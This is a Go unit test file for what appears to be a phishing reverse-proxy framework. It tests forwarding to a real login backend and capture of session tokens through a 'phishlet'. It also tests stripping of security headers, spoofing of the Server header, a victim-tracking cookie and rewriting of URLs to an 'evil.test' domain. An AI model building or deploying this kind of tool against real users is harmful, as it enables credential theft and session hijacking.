package proxy

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/phantomgate/phantomgate/internal/config"
	"github.com/phantomgate/phantomgate/internal/lure"
	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

func newTestProxy(backendURL string) *PhantomProxy {
	host := strings.TrimPrefix(backendURL, "http://")
	host = strings.TrimPrefix(host, "https://")

	cfg := config.DefaultConfig()
	cfg.Domain = "evil.test"
	cfg.Stealth.RandomizeTimings = false

	p := &phishlet.Phishlet{
		Name: "test",
		ProxyHosts: []phishlet.ProxyHost{
			{PhishSub: "login", OrigSub: host, Domain: "test", Session: true, IsSSL: false},
		},
		AuthTokens: []phishlet.AuthToken{
			{Domain: ".test", Keys: []string{"SESSION"}},
		},
	}

	s := store.NewStore("")
	lg := lure.NewGenerator("evil.test")
	return NewPhantomProxy(cfg, p, s, lg)
}

func TestProxyUnknownHost(t *testing.T) {
	pp := newTestProxy("http://127.0.0.1:9999")

	req := httptest.NewRequest("GET", "http://unknown.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	if w.Code != 404 {
		t.Errorf("expected 404 for unknown host, got %d", w.Code)
	}
}

func TestProxyForwardsRequest(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte("backend response"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)

	req := httptest.NewRequest("GET", "http://login.evil.test/test", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	body, _ := io.ReadAll(w.Result().Body)
	if !strings.Contains(string(body), "backend response") {
		t.Errorf("expected backend response, got %q", string(body))
	}
}

func TestProxyStripsSecurityHeaders(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy", "default-src 'self'")
		w.Header().Set("Strict-Transport-Security", "max-age=31536000")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)

	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	resp := w.Result()
	for _, h := range []string{"Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options"} {
		if resp.Header.Get(h) != "" {
			t.Errorf("expected header %s to be stripped, but found %q", h, resp.Header.Get(h))
		}
	}
}

func TestProxySpoofServerHeader(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "RealServer/1.0")
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)

	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	server := w.Result().Header.Get("Server")
	if server != "Microsoft-IIS/10.0" {
		t.Errorf("expected spoofed Server header, got %q", server)
	}
}

func TestVictimTracking(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	}))
	defer backend.Close()

	pp := newTestProxy(backend.URL)

	req := httptest.NewRequest("GET", "http://login.evil.test/", nil)
	w := httptest.NewRecorder()
	pp.ServeHTTP(w, req)

	resp := w.Result()
	cookies := resp.Cookies()

	found := false
	for _, c := range cookies {
		if c.Name == "_pg_vid" {
			found = true
			if c.Value == "" {
				t.Error("tracking cookie should have a value")
			}
			if !c.HttpOnly {
				t.Error("tracking cookie should be HttpOnly")
			}
		}
	}
	if !found {
		t.Error("expected _pg_vid tracking cookie")
	}
}

func TestRewriteURLToPhish(t *testing.T) {
	pp := newTestProxy("http://127.0.0.1:9999")

	tests := []struct {
		input    string
		expected string
	}{
		{"https://127.0.0.1:9999/login", "https://login.evil.test/login"},
	}

	for _, tc := range tests {
		result := pp.rewriteURLToPhish(tc.input)
		if result != tc.expected {
			t.Errorf("rewriteURLToPhish(%q) = %q, want %q", tc.input, result, tc.expected)
		}
	}
}

func TestRewriteURLToReal(t *testing.T) {
	pp := newTestProxy("http://127.0.0.1:9999")

	result := pp.rewriteURLToReal("https://login.evil.test/path")
	if result != "https://127.0.0.1:9999/path" {
		t.Errorf("rewriteURLToReal unexpected result: %q", result)
	}
}

func TestGetListenAddr(t *testing.T) {
	pp := newTestProxy("http://127.0.0.1:9999")
	addr := pp.GetListenAddr()
	if addr != "0.0.0.0:443" {
		t.Errorf("expected '0.0.0.0:443', got %q", addr)
	}
}

func TestSelfSignedTLS(t *testing.T) {
	pp := newTestProxy("http://127.0.0.1:9999")
	tlsCfg, err := pp.CreateTLSConfig()
	if err != nil {
		t.Fatalf("CreateTLSConfig failed: %v", err)
	}
	if len(tlsCfg.Certificates) == 0 {
		t.Error("expected at least one certificate")
	}
}
